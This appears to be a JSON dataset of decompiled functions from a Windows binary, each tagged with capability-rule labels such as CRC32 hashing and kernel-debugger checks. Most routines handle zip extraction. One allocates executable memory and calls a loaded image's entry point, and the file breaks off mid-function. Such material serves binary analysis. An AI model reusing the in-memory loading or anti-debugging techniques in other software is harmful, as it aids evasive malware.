{
    "00401c90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401ce1)\n\nuint8_t fcn.00401c90(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    pcVar2 = *0x440014;\n    var_14h = 0xffffffff;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    (**0x440014)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    var_4h = &var_14h;\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    puVar3 = var_4h;\n    puVar1 = cpuid_Version_info(1);\n    uVar6 = puVar1[1];\n    uVar5 = puVar1[2];\n    uVar4 = puVar1[3];\n    *var_4h = *puVar1;\n    puVar3[1] = uVar6;\n    puVar3[2] = uVar4;\n    puVar3[3] = uVar5;\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    return var_ch >> 0x1f & 1;\n}\n",
        "token_count": 377
    },
    "004052e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.004052e0(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    uint32_t uVar5;\n    uint32_t var_4h;\n    \n    uVar5 = -((in_AL & 2) != 0);\n    uVar4 = 0;\n    if (*(unaff_ESI + 0x46) != 0) {\n        var_4h = *(unaff_ESI + 0x46);\n        puVar3 = *(unaff_ESI + 0x138) + 0xc;\n        do {\n            if (puVar3[-1] != 0) {\n                uVar1 = *puVar3;\n                if (uVar1 < uVar5) {\n                    uVar5 = uVar1;\n                }\n                uVar1 = uVar1 + puVar3[-1];\n                if (uVar4 < uVar1) {\n                    uVar4 = uVar1;\n                }\n            }\n            puVar3 = puVar3 + 10;\n            var_4h = var_4h - 1;\n        } while (var_4h != 0);\n    }\n    iVar2 = (**0x469204)(*(unaff_ESI + 0x74) + uVar5, uVar4 - uVar5, 0x3000, 0x40);\n    *(unaff_ESI + 0x148) = iVar2;\n    *(unaff_ESI + 0x144) = *(unaff_ESI + 0x74);\n    if (iVar2 == 0) {\n        if ((*(unaff_ESI + 0x56) & 1) != 0) {\n            return 4;\n        }\n        iVar2 = (**0x469204)(0, uVar4 - uVar5, 0x3000, 0x40);\n        *(unaff_ESI + 0x148) = iVar2;\n        *(unaff_ESI + 0x144) = iVar2 - uVar5;\n    }\n    return (-(*(unaff_ESI + 0x148) != 0) & 0xfffffffd) + 3;\n}\n",
        "token_count": 514
    },
    "00405750": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_164h\n\nvoid __cdecl fcn.00405750(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_164h;\n    uint var_160h;\n    int32_t var_f8h;\n    uint var_a8h;\n    int32_t var_28h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    code *var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    if (arg_8h == 0) {\n        fcn.0042ad2a(arg_14h);\n        return;\n    }\n    var_28h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_8h = NULL;\n    iVar1 = fcn.00405200(arg_8h, arg_ch);\n    if (((((iVar1 == 0) && (iVar1 = fcn.004052e0(),  iVar1 == 0)) &&\n         (iVar1 = fcn.004053a0(arg_8h, arg_ch, arg_10h),  iVar1 == 0)) &&\n        ((iVar1 = fcn.00405440(&var_160h),  iVar1 == 0 && (iVar1 = fcn.00405500(),  iVar1 == 0)))) &&\n       (iVar1 = fcn.00405690(),  iVar1 == 0)) {\n        if (((arg_10h & 1) == 0) && (var_f8h != 0)) {\n            var_8h = var_f8h + var_1ch;\n            iVar1 = (*var_8h)(var_1ch, 1, 0);\n            if (iVar1 == 0) {\n                fcn.0042ad2a(arg_14h);\n                return;\n            }\n        }\n        if (arg_14h == NULL) {\n            if (var_14h != 0) {\n                uVar2 = 0;\n                if (var_10h != 0) {\n                    do {\n                        (**0x469314)(*(var_14h + uVar2 * 4));\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < var_10h);\n                }\n                fcn.0042aeff(var_14h);\n            }\n        }\n        else {\n            arg_14h[2] = var_1ch;\n            arg_14h[3] = var_18h;\n            arg_14h[4] = var_8h;\n            arg_14h[5] = var_a8h;\n            *arg_14h = 0x20;\n            arg_14h[1] = arg_10h;\n            arg_14h[6] = var_14h;\n            arg_14h[7] = var_10h;\n        }\n        if (var_28h != 0) {\n            fcn.0042aeff(var_28h);\n        }\n    }\n    fcn.0042ad2a(arg_14h);\n    return;\n}\n",
        "token_count": 767
    },
    "00405a20": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a20(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4453c4;\n    fcn.0042b3a3();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "004084c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_294h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004084c0(int32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    unkint3 Var3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *arg_ch_00;\n    uint8_t uVar9;\n    int32_t *in_ECX;\n    uint8_t uVar10;\n    uint *puVar11;\n    ulong uVar12;\n    uint32_t var_294h;\n    uint32_t var_284h;\n    uint var_27ch;\n    uint var_278h;\n    uint32_t var_260h;\n    uint var_244h;\n    uint32_t var_240h;\n    uint var_23ch;\n    uint var_238h;\n    int32_t *var_234h;\n    uint var_230h;\n    uint32_t var_22ch;\n    uint32_t var_228h;\n    uint32_t var_224h;\n    uint8_t var_220h;\n    uint8_t var_21fh;\n    uint8_t var_21eh;\n    uint var_21dh;\n    uint var_216h;\n    uint16_t var_212h;\n    int16_t var_210h;\n    ushort var_20eh;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    if ((arg_8h < -1) || (*(*in_ECX + 4) <= arg_8h)) {\n        fcn.0042ad2a(var_294h);\n        return;\n    }\n    var_234h = in_ECX;\n    if (in_ECX[1] != -1) {\n        fcn.00408430(*in_ECX);\n    }\n    in_ECX[1] = -1;\n    if (arg_8h == in_ECX[0x4d]) {\n        if (arg_8h != -1) {\n            fcn.0042af40(arg_ch, in_ECX + 2, 300);\n            fcn.0042ad2a(var_294h);\n            return;\n        }\ncode_r0x00408547:\n        *arg_ch = *(*in_ECX + 4);\n        *(arg_ch + 1) = 0;\n        arg_ch[0x42] = 0;\n        arg_ch[0x43] = 0;\n        arg_ch[0x44] = 0;\n        arg_ch[0x45] = 0;\n        arg_ch[0x46] = 0;\n        arg_ch[0x47] = 0;\n        arg_ch[0x48] = 0;\n        arg_ch[0x49] = 0;\n        arg_ch[0x4a] = 0;\n        fcn.0042ad2a(var_294h);\n        return;\n    }\n    if (arg_8h == -1) goto code_r0x00408547;\n    if (arg_8h < *(*in_ECX + 0x10)) {\n        fcn.00408080(*in_ECX);\n    }\n    iVar5 = *(*in_ECX + 0x10);\n    while (iVar5 < arg_8h) {\n        fcn.004080d0(*in_ECX);\n        iVar5 = *(*in_ECX + 0x10);\n    }\n    arg_ch_00 = &var_294h;\n    fcn.00407d00(*in_ECX, arg_ch_00, 0, &var_108h, 0x104, 0, 0, 0, 0);\n    iVar5 = fcn.00408250(*in_ECX, &var_22ch, &var_224h, &var_228h);\n    if (iVar5 != 0) {\n        fcn.0042ad2a(var_294h);\n        return;\n    }\n    pcVar2 = **in_ECX;\n    if (*pcVar2 == '\\0') {\n        *(pcVar2 + 0x1c) = var_224h;\n    }\n    else {\n        if (pcVar2[1] == '\\0') goto code_r0x0040868f;\n        (**0x469108)(*(pcVar2 + 4), *(pcVar2 + 0xc) + var_224h, 0, 0);\n    }\n    iVar5 = fcn.0042a209(var_228h);\n    uVar6 = fcn.004078b0(iVar5, 1, var_228h, **in_ECX);\n    if (uVar6 == var_228h) {\n        *arg_ch = *(*in_ECX + 0x10);\n        fcn.0042ad40(&var_20ch, &var_108h);\n        puVar11 = &var_20ch;\n        while( true ) {\n            while( true ) {\n                while( true ) {\n                    while( true ) {\n                        while( true ) {\n                            while( true ) {\n                                for (; (cVar1 = *puVar11,  cVar1 != '\\0' && (*(puVar11 + 1) == ':'));\n                                    puVar11 = puVar11 + 2) {\n                                }\n                                if (cVar1 != '\\\\') break;\n                                puVar11 = puVar11 + 1;\n                            }\n                            if (cVar1 != '/') break;\n                            puVar11 = puVar11 + 1;\n                        }\n                        iVar7 = fcn.0042c0ff(puVar11, 0x446d48);\n                        if (iVar7 == 0) break;\n                        puVar11 = iVar7 + 4;\n                    }\n                    iVar7 = fcn.0042c0ff(puVar11, 0x446d40);\n                    if (iVar7 == 0) break;\n                    puVar11 = iVar7 + 4;\n                }\n                iVar7 = fcn.0042c0ff(puVar11, 0x446d38);\n                if (iVar7 == 0) break;\n                puVar11 = iVar7 + 4;\n            }\n            iVar7 = fcn.0042c0ff(puVar11, 0x446d30);\n            if (iVar7 == 0) break;\n            puVar11 = iVar7 + 4;\n        }\n        fcn.0042bfbb(arg_ch + 1, puVar11, 0x104);\n        var_21dh._0_1_ = var_260h >> 0x1e & 1;\n        uVar10 = ~(var_260h >> 0x17);\n        uVar6 = var_294h >> 8;\n        var_21fh = 0;\n        var_220h = 0;\n        var_21eh = 1;\n        if ((((uVar6 == 0) || (uVar6 == 7)) || (uVar6 == 0xb)) || (uVar6 == 0xe)) {\n            var_21fh = var_260h >> 1 & 1;\n            var_220h = var_260h >> 2 & 1;\n            uVar10 = var_260h;\n            uVar4 = var_260h >> 5 & 1;\n            uVar9 = var_260h >> 4 & 1;\n        }\n        else {\n            uVar4 = 1;\n            uVar9 = var_21dh;\n        }\n        arg_ch[0x42] = 0;\n        if (uVar9 != 0) {\n            arg_ch[0x42] = 0x10;\n        }\n        if (uVar4 != 0) {\n            arg_ch[0x42] = arg_ch[0x42] | 0x20;\n        }\n        if (var_21fh != 0) {\n            arg_ch[0x42] = arg_ch[0x42] | 2;\n        }\n        if ((uVar10 & 1) != 0) {\n            arg_ch[0x42] = arg_ch[0x42] | 1;\n        }\n        if (var_220h != 0) {\n            arg_ch[0x42] = arg_ch[0x42] | 4;\n        }\n        arg_ch[0x49] = var_27ch;\n        arg_ch[0x4a] = var_278h;\n        var_216h._0_2_ = var_284h >> 0x10;\n        var_21dh._1_2_ = (var_216h >> 9) + 0x7bc;\n        *0x8 = var_216h >> 5 & 0xf;\n        var_216h._0_2_ = var_216h & 0x1f;\n        var_216h._2_2_ = var_284h >> 0xb;\n        var_212h = var_284h >> 5 & 0x3f;\n        var_210h = (var_284h & 0x1f) * 2;\n        puVar11 = &var_230h;\n        var_20eh = 0;\n        (**0x4691fc)(&var_21dh + 1);\n        var_244h = var_230h;\n        var_240h = var_22ch;\n        (**0x469268)(&var_244h, &var_23ch);\n        iVar7 = 0;\n        arg_ch[0x43] = var_23ch;\n        arg_ch[0x44] = var_238h;\n        arg_ch[0x45] = var_23ch;\n        arg_ch[0x46] = var_238h;\n        arg_ch[0x47] = var_23ch;\n        arg_ch[0x48] = var_238h;\n        if (4 < var_228h) {\n            do {\n                var_22ch = *(iVar5 + 2 + iVar7);\n                var_224h._0_2_ = CONCAT11(*(iVar5 + 1 + iVar7), *(iVar7 + iVar5));\n                var_224h = var_224h & 0xff000000 | var_224h;\n                iVar8 = fcn.0042c1a0(&var_224h, 0x446d2c);\n                if (iVar8 == 0) {\n                    uVar10 = *(iVar7 + 4 + iVar5);\n                    var_21dh._0_1_ = uVar10 >> 1 & 1;\n                    var_21eh = uVar10 >> 2 & 1;\n                    iVar8 = iVar7 + 5;\n                    if ((uVar10 & 1) != 0) {\n                        Var3 = CONCAT21(CONCAT11(*(iVar7 + 8 + iVar5), *(iVar7 + 7 + iVar5)), *(iVar7 + 6 + iVar5));\n                        uVar6 = CONCAT31(Var3, *(iVar8 + iVar5));\n                        iVar8 = iVar7 + 9;\n                        arg_ch_00 = uVar6 + 0xb6109100;\n                        uVar12 = fcn.0042c120(arg_ch_00, (Var3 >> 0x17) + 2 + (0x49ef6eff < uVar6), 10000000, 0);\n                        arg_ch[0x47] = uVar12;\n                        arg_ch[0x48] = uVar12 >> 0x20;\n                    }\n                    if (var_21dh != 0) {\n                        Var3 = CONCAT21(CONCAT11(*(iVar8 + 3 + iVar5), *(iVar8 + 2 + iVar5)), *(iVar8 + 1 + iVar5));\n                        uVar6 = CONCAT31(Var3, *(iVar8 + iVar5));\n                        iVar8 = iVar8 + 4;\n                        uVar12 = fcn.0042c120(arg_ch_00, (Var3 >> 0x17) + 2 + (0x49ef6eff < uVar6), 10000000, 0, \n                                              uVar6 + 0xb6109100);\n                        arg_ch[0x43] = uVar12;\n                        arg_ch[0x44] = uVar12 >> 0x20;\n                    }\n                    if (var_21eh != 0) {\n                        Var3 = CONCAT21(CONCAT11(*(iVar8 + 3 + iVar5), *(iVar8 + 2 + iVar5)), *(iVar8 + 1 + iVar5));\n                        uVar6 = CONCAT31(Var3, *(iVar8 + iVar5));\n                        uVar12 = fcn.0042c120(arg_ch_00, (Var3 >> 0x17) + 2 + (0x49ef6eff < uVar6), 10000000, 0, \n                                              uVar6 + 0xb6109100);\n                        arg_ch[0x45] = uVar12;\n                        arg_ch[0x46] = uVar12 >> 0x20;\n                    }\n                    break;\n                }\n                iVar7 = iVar7 + 4 + var_22ch;\n            } while (iVar7 + 4U < var_228h);\n        }\n        if (iVar5 != 0) {\n            fcn.0042c228(iVar5);\n        }\n        fcn.0042af40(var_234h + 2, arg_ch, 300);\n        var_234h[0x4d] = arg_8h;\n        fcn.0042ad2a(puVar11);\n        return;\n    }\n    fcn.0042c228(iVar5);\ncode_r0x0040868f:\n    fcn.0042ad2a(var_294h);\n    return;\n}\n",
        "token_count": 3098
    },
    "0040a260": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a260(int32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t *arg_8h_01;\n    uint8_t *puVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        return 0xffffff9a;\n    }\n    if (arg_8h[0x1f] != 0) {\n        fcn.00408430(arg_8h);\n    }\n    iVar1 = fcn.00408250(arg_8h_00, &var_8h, &arg_8h, &var_4h);\n    if (iVar1 == 0) {\n        arg_8h_01 = fcn.0042ae6b(0x84);\n        if (arg_8h_01 != NULL) {\n            iVar1 = fcn.0042ae6b(0x4000);\n            *arg_8h_01 = iVar1;\n            arg_8h_01[0x11] = arg_8h;\n            arg_8h_01[0x12] = var_4h;\n            arg_8h_01[0x13] = 0;\n            if (iVar1 != 0) {\n                arg_8h_01[0x10] = 0;\n                iVar1 = arg_8h_00[0xd];\n                arg_8h_01[0x15] = arg_8h_00[0xf];\n                arg_8h_01[0x14] = 0;\n                arg_8h_01[0x19] = arg_8h_00[0xd];\n                arg_8h_01[0x18] = *arg_8h_00;\n                arg_8h_01[0x1a] = arg_8h_00[3];\n                arg_8h_01[6] = 0;\n                if (iVar1 != 0) {\n                    arg_8h_01[9] = 0;\n                    arg_8h_01[10] = 0;\n                    arg_8h_01[0xb] = 0;\n                    iVar1 = fcn.004076e0(arg_8h_01 + 1);\n                    if (iVar1 == 0) {\n                        arg_8h_01[0x10] = 1;\n                    }\n                }\n                arg_8h_01[0x16] = arg_8h_00[0x10];\n                arg_8h_01[0x17] = arg_8h_00[0x11];\n                *(arg_8h_01 + 0x1b) = *(arg_8h_00 + 0xc) & 1;\n                if ((arg_8h_00[0xc] >> 3 & 1) == 0) {\n                    *(arg_8h_01 + 0x20) = *(arg_8h_00 + 0x3f);\n                }\n                else {\n                    *(arg_8h_01 + 0x20) = *(arg_8h_00 + 0x39);\n                }\n                arg_8h_01[0x1f] = -(*(arg_8h_01 + 0x1b) != '\\0') & 0xc;\n                arg_8h_01[0x1c] = 0x12345678;\n                arg_8h_01[0x1d] = 0x23456789;\n                arg_8h_01[0x1e] = 0x34567890;\n                for (puVar2 = arg_ch; (puVar2 != NULL && (*puVar2 != 0)); puVar2 = puVar2 + 1) {\n                    fcn.00407400(arg_8h_01 + 0x1c, *puVar2);\n                }\n                arg_8h_01[0xf] = arg_8h_00[0x1e] + 0x1e + var_8h;\n                arg_8h_01[2] = 0;\n                arg_8h_00[0x1f] = arg_8h_01;\n                return 0;\n            }\n            fcn.0042aeff(arg_8h_01);\n        }\n        return 0xffffff98;\n    }\n    return 0xffffff99;\n}\n",
        "token_count": 1037
    },
    "0040a720": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_344h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a720(int32_t arg_8h, char *arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    char *pcVar6;\n    uint unaff_ESI;\n    char *pcVar7;\n    uint var_344h;\n    char *var_340h;\n    uint var_339h;\n    uint32_t var_230h;\n    uint var_22ch;\n    uint var_224h;\n    uint var_21ch;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_340h = arg_ch;\n    if (arg_14h == 3) {\n        if (arg_8h != in_ECX[1]) {\n            if (in_ECX[1] != -1) {\n                fcn.00408430(*in_ECX);\n            }\n            iVar5 = *in_ECX;\n            in_ECX[1] = -1;\n            if (*(iVar5 + 4) <= arg_8h) goto code_r0x0040a75b;\n            if (arg_8h < *(iVar5 + 0x10)) {\n                fcn.00408080(iVar5);\n            }\n            iVar5 = *(*in_ECX + 0x10);\n            while (iVar5 < arg_8h) {\n                fcn.004080d0(*in_ECX);\n                iVar5 = *(*in_ECX + 0x10);\n            }\n            fcn.0040a260(*in_ECX, in_ECX[0x4e]);\n            in_ECX[1] = arg_8h;\n        }\n        iVar5 = fcn.0040a3e0(*in_ECX, arg_ch, arg_10h, &var_339h);\n        if (iVar5 < 1) {\n            fcn.00408430(*in_ECX);\n            in_ECX[1] = -1;\n        }\n        if (var_339h == '\\0') {\n            if (iVar5 < 1) {\n                fcn.0042ad2a(var_344h);\n                return;\n            }\n            fcn.0042ad2a(var_344h);\n            return;\n        }\ncode_r0x0040a80f:\n        fcn.0042ad2a(unaff_ESI);\n        return;\n    }\n    if ((arg_14h != 2) && (arg_14h != 1)) {\ncode_r0x0040a75b:\n        fcn.0042ad2a(var_344h);\n        return;\n    }\n    if (in_ECX[1] != -1) {\n        fcn.00408430(*in_ECX);\n    }\n    iVar5 = *in_ECX;\n    in_ECX[1] = -1;\n    if (*(iVar5 + 4) <= arg_8h) goto code_r0x0040a75b;\n    if (arg_8h < *(iVar5 + 0x10)) {\n        fcn.00408080(iVar5);\n    }\n    iVar5 = *(*in_ECX + 0x10);\n    while (iVar5 < arg_8h) {\n        iVar5 = *in_ECX;\n        if (((iVar5 != 0) && (*(iVar5 + 0x18) != 0)) && (iVar3 = *(iVar5 + 0x10) + 1,  iVar3 != *(iVar5 + 4))) {\n            *(iVar5 + 0x14) = *(iVar5 + 0x14) + *(iVar5 + 0x50) + *(iVar5 + 0x4c) + 0x2e + *(iVar5 + 0x48);\n            *(iVar5 + 0x10) = iVar3;\n            iVar3 = fcn.00407d00(iVar5, iVar5 + 0x28, iVar5 + 0x78, 0, 0, 0, 0, 0, 0);\n            *(iVar5 + 0x18) = iVar3 == 0;\n        }\n        iVar5 = *(*in_ECX + 0x10);\n    }\n    fcn.004084c0(arg_8h, &var_339h + 1);\n    pcVar4 = var_340h;\n    if ((var_230h >> 4 & 1) != 0) goto code_r0x0040a80f;\n    var_20ch._0_1_ = 0;\n    if (arg_14h == 1) goto code_r0x0040a9b1;\n    cVar2 = *var_340h;\n    pcVar6 = var_340h;\n    pcVar7 = var_340h;\n    while (cVar2 != '\\0') {\n        if ((cVar2 == '/') || (cVar2 == '\\\\')) {\n            pcVar7 = pcVar6 + 1;\n        }\n        pcVar1 = pcVar6 + 1;\n        pcVar6 = pcVar6 + 1;\n        cVar2 = *pcVar1;\n    }\n    fcn.0042bfbb(&var_108h, var_340h, 0x104);\n    if (pcVar7 == pcVar4) {\n        var_108h._0_1_ = '\\0';\ncode_r0x0040a96a:\n        (**0x4690ac)(&var_20ch, 0x446e3c, in_ECX + 0x50, &var_108h, pcVar7);\n    }\n    else {\n        pcVar7[&var_108h - pcVar4] = '\\0';\n        if (((var_108h != '/') && (var_108h != '\\\\')) && ((var_108h == '\\0' || (var_108h._1_1_ != ':'))))\n        goto code_r0x0040a96a;\n        (**0x4690ac)(&var_20ch, 0x446e34, &var_108h, pcVar7);\n    }\n    pcVar4 = (**0x4690ec)(&var_20ch, 0x40000000, 0, 0, 2, var_230h, 0);\ncode_r0x0040a9b1:\n    if (pcVar4 == 0xffffffff) {\n        fcn.0042ad2a(unaff_ESI);\n        return;\n    }\n    fcn.0040a260(*in_ECX, in_ECX[0x4e]);\n    if (in_ECX[0x4f] == 0) {\n        iVar5 = fcn.0042a209(0x4000);\n        in_ECX[0x4f] = iVar5;\n    }\n    var_340h = NULL;\n    do {\n        iVar5 = fcn.0040a3e0(*in_ECX, in_ECX[0x4f], 0x4000, &var_339h);\n        if (iVar5 == -0x6a) {\n            var_340h = 0x1000;\n            goto code_r0x0040aac2;\n        }\n        if (iVar5 < 0) break;\n        if ((0 < iVar5) && (iVar3 = (**0x469158)(pcVar4, in_ECX[0x4f], iVar5, &var_344h, 0),  iVar3 == 0)) {\n            var_340h = 0x400;\n            goto code_r0x0040aac2;\n        }\n        if (var_339h != '\\0') goto code_r0x0040aac2;\n    } while (iVar5 != 0);\n    var_340h = 0x5000000;\ncode_r0x0040aac2:\n    fcn.00408430(*in_ECX);\n    if (var_340h == NULL) {\n        (**0x469294)(pcVar4, &var_224h, &var_22ch, &var_21ch);\n    }\n    if (arg_14h != 1) {\n        (**0x4690f0)(pcVar4);\n    }\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1914
    },
    "0040ac70": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_344h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ac70(int32_t *arg_8h, int32_t arg_ch, char *arg_10h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint unaff_ESI;\n    char *pcVar9;\n    uint var_344h;\n    char var_33dh;\n    char *var_33ch;\n    uint var_338h;\n    uint32_t var_230h;\n    uint var_22ch;\n    uint var_224h;\n    uint var_21ch;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_33ch = arg_10h;\n    if (arg_8h == NULL) {\n        *0x458684 = 0x10000;\n        fcn.0042ad2a(var_344h);\n        return;\n    }\n    if (*arg_8h != 1) {\n        *0x458684 = 0x80000;\n        fcn.0042ad2a(var_344h);\n        return;\n    }\n    piVar3 = arg_8h[1];\n    if (piVar3[1] != -1) {\n        fcn.00408430(*piVar3);\n    }\n    iVar6 = *piVar3;\n    piVar3[1] = -1;\n    if (*(iVar6 + 4) <= arg_ch) {\n        pcVar4 = 0x10000;\n        goto code_r0x0040af4c;\n    }\n    if (arg_ch < *(iVar6 + 0x10)) {\n        fcn.00408080(iVar6);\n    }\n    iVar6 = *(*piVar3 + 0x10);\n    while (iVar6 < arg_ch) {\n        iVar6 = *piVar3;\n        if (((iVar6 != 0) && (*(iVar6 + 0x18) != 0)) && (iVar5 = *(iVar6 + 0x10) + 1,  iVar5 != *(iVar6 + 4))) {\n            *(iVar6 + 0x14) = *(iVar6 + 0x14) + *(iVar6 + 0x50) + *(iVar6 + 0x4c) + 0x2e + *(iVar6 + 0x48);\n            *(iVar6 + 0x10) = iVar5;\n            iVar5 = fcn.00407d00(iVar6, iVar6 + 0x28, iVar6 + 0x78, 0, 0, 0, 0, 0, 0);\n            *(iVar6 + 0x18) = iVar5 == 0;\n        }\n        iVar6 = *(*piVar3 + 0x10);\n    }\n    fcn.004084c0(arg_ch, &var_338h);\n    pcVar4 = var_33ch;\n    if ((var_230h >> 4 & 1) != 0) {\n        pcVar4 = NULL;\n        goto code_r0x0040af4c;\n    }\n    cVar2 = *var_33ch;\n    var_20ch._0_1_ = 0;\n    pcVar8 = var_33ch;\n    pcVar9 = var_33ch;\n    while (cVar2 != '\\0') {\n        if ((cVar2 == '/') || (cVar2 == '\\\\')) {\n            pcVar9 = pcVar8 + 1;\n        }\n        pcVar1 = pcVar8 + 1;\n        pcVar8 = pcVar8 + 1;\n        cVar2 = *pcVar1;\n    }\n    fcn.0042bfbb(&var_108h, var_33ch, 0x104);\n    if (pcVar9 == pcVar4) {\n        var_108h._0_1_ = '\\0';\ncode_r0x0040add3:\n        (**0x4690ac)(&var_20ch, 0x446e3c, piVar3 + 0x50, &var_108h, pcVar9);\n    }\n    else {\n        pcVar9[&var_108h - pcVar4] = '\\0';\n        if (((var_108h != '/') && (var_108h != '\\\\')) && ((var_108h == '\\0' || (var_108h._1_1_ != ':'))))\n        goto code_r0x0040add3;\n        (**0x4690ac)(&var_20ch, 0x446e34, &var_108h, pcVar9);\n    }\n    iVar6 = (**0x4690ec)(&var_20ch, 0x40000000, 0, 0, 2, var_230h, 0);\n    if (iVar6 == -1) {\n        pcVar4 = 0x200;\n    }\n    else {\n        fcn.0040a260(*piVar3, piVar3[0x4e]);\n        if (piVar3[0x4f] == 0) {\n            iVar5 = fcn.0042a209(0x4000);\n            piVar3[0x4f] = iVar5;\n        }\n        var_33ch = NULL;\n        do {\n            iVar5 = fcn.0040a3e0(*piVar3, piVar3[0x4f], 0x4000, &var_33dh);\n            if (iVar5 == -0x6a) {\n                var_33ch = 0x1000;\n                goto code_r0x0040af12;\n            }\n            if (iVar5 < 0) break;\n            if ((0 < iVar5) && (iVar7 = (**0x469158)(iVar6, piVar3[0x4f], iVar5, &var_344h, 0),  iVar7 == 0)) {\n                var_33ch = 0x400;\n                goto code_r0x0040af12;\n            }\n            if (var_33dh != '\\0') goto code_r0x0040af12;\n        } while (iVar5 != 0);\n        var_33ch = 0x5000000;\ncode_r0x0040af12:\n        fcn.00408430(*piVar3);\n        pcVar4 = var_33ch;\n        if (var_33ch == NULL) {\n            (**0x469294)(iVar6, &var_224h, &var_22ch, &var_21ch);\n        }\n        (**0x4690f0)(iVar6);\n    }\ncode_r0x0040af4c:\n    *0x458684 = pcVar4;\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1581
    },
    "0040ef60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040ef60(uchar *arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint32_t arg_20h, \n            uint noname_7, int32_t arg_28h, uint *arg_2ch, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint32_t arg_40h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *in_FS_OFFSET;\n    uint var_de8h;\n    uchar *var_de0h;\n    uint var_ddch;\n    int32_t var_dd8h;\n    uint32_t var_dd4h;\n    uint32_t var_dd0h;\n    uint var_dc0h;\n    uint32_t var_dbch;\n    uint32_t var_db4h;\n    uint var_da4h;\n    uint32_t var_da0h;\n    uint *var_d98h;\n    uint var_d88h;\n    